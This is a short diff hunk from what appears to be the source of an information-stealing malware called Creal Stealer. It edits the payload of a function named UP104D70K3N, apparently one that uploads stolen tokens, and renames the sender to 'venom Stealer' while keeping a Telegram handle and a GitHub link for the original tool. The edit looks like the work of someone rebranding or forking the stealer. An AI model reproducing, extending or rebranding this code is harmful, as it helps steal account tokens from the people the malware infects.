@@ -489,7 +489,7 @@ def UP104D70K3N(token, path):
                 }
             }
         ],
-        "username": f"Creal Stealer | t.me/Creal Stealer",
+        "username": f"venom Stealer | t.me/Creal Stealer",
         "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
         "attachments": []
         }
